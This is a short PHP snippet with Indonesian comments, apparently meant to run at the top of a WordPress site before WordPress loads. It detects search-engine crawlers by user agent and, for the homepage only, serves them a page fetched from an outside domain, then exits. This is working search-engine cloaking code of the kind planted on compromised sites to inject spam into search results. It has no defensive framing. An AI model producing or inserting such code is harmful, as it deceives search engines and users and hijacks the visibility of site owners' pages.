// 1. Deteksi SEBELUM WordPress load
$is_bot = false;
$bots = ["Googlebot", "bingbot", "Slurp"];
foreach($bots as $bot) {
    if(strpos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// 2. Jika bot, tampilkan konten berbeda
if($is_bot && $_SERVER['REQUEST_URI'] == '/') {
    // Ambil konten dari sumber lain
    $content = file_get_contents('https://pessawat.site/rezekigakkemana/');
    echo $content;
    exit; // STOP sebelum WordPress load
}
